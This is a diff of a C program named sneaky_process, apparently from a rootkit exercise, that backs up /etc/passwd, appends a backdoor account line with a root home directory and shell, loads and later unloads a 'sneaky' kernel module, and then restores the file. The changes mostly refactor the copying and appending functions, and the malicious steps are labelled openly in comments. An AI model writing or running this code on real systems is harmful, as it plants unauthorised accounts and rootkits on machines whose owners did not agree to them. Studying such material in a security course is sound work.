@@ -22,44 +22,64 @@
 #include <sys/wait.h>
 #include <fcntl.h>
 
-void copy_file(const char *src, const char *dst)
+void cpy_file(const char *src_path, const char *dest_path)
 {
-    int fd_src, fd_dst;
-    char buffer[4096];
-    ssize_t bytes_read;
+    FILE *src, *dest;
+    int sneaky_char;
 
-    fd_src = open(src, O_RDONLY);
-    fd_dst = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-
-    while ((bytes_read = read(fd_src, buffer, sizeof(buffer))) > 0)
+    src = fopen(src_path, "r");
+    if (src == NULL)
     {
-        write(fd_dst, buffer, bytes_read);
+        perror("Error opening src file");
+        exit(EXIT_FAILURE);
     }
 
-    close(fd_src);
-    close(fd_dst);
+    dest = fopen(dest_path, "w");
+    if (dest == NULL)
+    {
+        perror("Error opening dest file");
+        fclose(src);
+        exit(EXIT_FAILURE);
+    }
+
+    while ((sneaky_char = fgetc(src)) != EOF)
+    {
+        fputc(sneaky_char, dest);
+    }
+
+    fclose(src);
+    fclose(dest);
 }
 
-void add_sneaky_user()
+void do_sneaky(const char *sneaky_line)
 {
-    FILE *passwd_file;
+    FILE *target_file;
 
-    passwd_file = fopen("/etc/passwd", "a");
-    fputs("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n", passwd_file);
-    fclose(passwd_file);
+    // copy /etc/passwd to /tmp/passwd
+    cpy_file("/etc/passwd", "/tmp/passwd");
+
+    target_file = fopen("/etc/passwd", "a");
+    if (target_file == NULL)
+    {
+        perror("Error opening target file");
+        exit(EXIT_FAILURE);
+    }
+
+    fputs(sneaky_line, target_file);
+
+    fclose(target_file);
 }
 
 int main()
 {
-    char c;
-
+    // Step 1: Print its own process ID to the screen
     printf("sneaky_process pid = %d\n", getpid());
 
-    // Step 2: Perform malicious act
-    copy_file("/etc/passwd", "/tmp/passwd");
-    add_sneaky_user();
+    // Step 2: Append a new line to the end of /etc/passwd
+    const char *sneaky_line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
+    do_sneaky(sneaky_line);
 
-    // Step 3: Load sneaky module
+    // Step 3: Load sneaky kernel module
     pid_t pid = fork();
     if (pid == 0)
     {
@@ -70,12 +90,13 @@ int main()
     }
     waitpid(pid, NULL, 0);
 
-    // Step 4: Loop until 'q' is pressed
-    while ((c = getchar()) != 'q')
+    // Step 4: Loop until 'q' is input from keyboard
+    char key_input;
+    while ((key_input = getchar()) != 'q')
     {
     }
 
-    // Step 5: Unload sneaky module
+    // Step 5: Unload sneaky kernel module
     pid = fork();
     if (pid == 0)
     {
@@ -84,8 +105,8 @@ int main()
     }
     waitpid(pid, NULL, 0);
 
-    // Step 6: Restore /etc/passwd and remove sneakyuser
-    copy_file("/tmp/passwd", "/etc/passwd");
+    // Step 6: Restore /etc/passwd
+    cpy_file("/tmp/passwd", "/etc/passwd");
 
-    return 0;
+    exit(EXIT_SUCCESS);
 }
